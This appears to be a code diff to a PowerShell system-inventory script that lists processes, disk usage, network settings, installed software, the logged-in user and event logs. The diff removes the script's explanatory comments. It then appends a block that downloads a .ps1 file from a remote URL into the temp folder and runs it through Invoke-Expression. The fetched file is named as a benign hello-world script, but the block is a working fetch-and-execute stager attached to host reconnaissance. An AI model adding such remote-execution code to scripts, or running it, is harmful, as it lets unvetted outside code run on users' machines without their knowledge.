@@ -1,21 +1,40 @@
 Write-Output "[+] Gathering System Information..."
 Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture, WindowsBuildLabEx | Format-Table -AutoSize
 
-Write-Output "[+] Listing Running Processes (Top 10)..." # Added Top 10 clarification
-Get-Process | Sort-Object CPU -Descending | Select-Object ProcessName, Id, CPU -First 10 | Format-Table -AutoSize # Sorted by CPU
+Write-Output "[+] Listing Running Processes (Top 10)..."
+Get-Process | Sort-Object CPU -Descending | Select-Object ProcessName, Id, CPU -First 10 | Format-Table -AutoSize
 
 Write-Output "[+] Checking Disk Space Usage..."
-Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -ne "A:\" -and $_.Root -ne "C:\"} | Select-Object Name, @{Name="Used(GB)";Expression={[math]::Round($_.Used / 1GB, 2)}}, @{Name="Free(GB)";Expression={[math]::Round($_.Free / 1GB, 2)}}, @{Name="Total(GB)";Expression={[math]::Round($_.Total / 1GB, 2)}} | Format-Table -AutoSize # Added Total and filtered out A: and C: drives
+Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -ne "A:\" -and $_.Root -ne "C:\"} | Select-Object Name, @{Name="Used(GB)";Expression={[math]::Round($_.Used / 1GB, 2)}}, @{Name="Free(GB)";Expression={[math]::Round($_.Free / 1GB, 2)}}, @{Name="Total(GB)";Expression={[math]::Round($_.Total / 1GB, 2)}} | Format-Table -AutoSize
 
 Write-Output "[+] Fetching Network Configuration..."
 Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv6Address | Format-Table -AutoSize
 
 Write-Output "[+] Retrieving Installed Software (Top 10)..."
-Get-WmiObject -Class Win32_Product | Sort-Object Name | Select-Object Name, Version -First 10 | Format-Table -AutoSize # Sorted by name
+Get-WmiObject -Class Win32_Product | Sort-Object Name | Select-Object Name, Version -First 10 | Format-Table -AutoSize
 
 Write-Output "[+] Checking Current Logged-In Users..."
-# More robust way to get logged-in user (accounts for multiple sessions)
 Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object UserName | Format-Table -AutoSize
 
-Write-Output "[+] Fetching Recent System Event Logs (Top 5)..." # Added Top 5 clarification
-Get-WinEvent -LogName System -MaxEvents 5 | Sort-Object TimeCreated -Descending | Select-Object TimeCreated, Id, Message | Format-Table -AutoSize # Sorted by TimeCreated
+Write-Output "[+] Fetching Recent System Event Logs (Top 5)..."
+Get-WinEvent -LogName System -MaxEvents 5 | Sort-Object TimeCreated -Descending | Select-Object TimeCreated, Id, Message | Format-Table -AutoSize
+
+# ----------------------------
+# Download and Execute Script
+# ----------------------------
+$scriptUrl = "https://raw.githubusercontent.com/rmadhavqh/benign-scripts/main/hello.ps1"
+$tempFile = "$env:TEMP\hello.ps1"
+
+Write-Output "[+] Downloading Hello World script from: $scriptUrl"
+try {
+    Invoke-WebRequest -Uri $scriptUrl -OutFile $tempFile -ErrorAction Stop
+    Write-Output "[+] Download Successful! Loading script into memory..."
+    
+    # Read and execute script in memory
+    $scriptContent = Get-Content -Path $tempFile -Raw
+    Invoke-Expression $scriptContent
+    
+    Write-Output "[+] Script executed successfully!"
+} catch {
+    Write-Output "[!] Failed to download or execute script. Error: $_"
+}
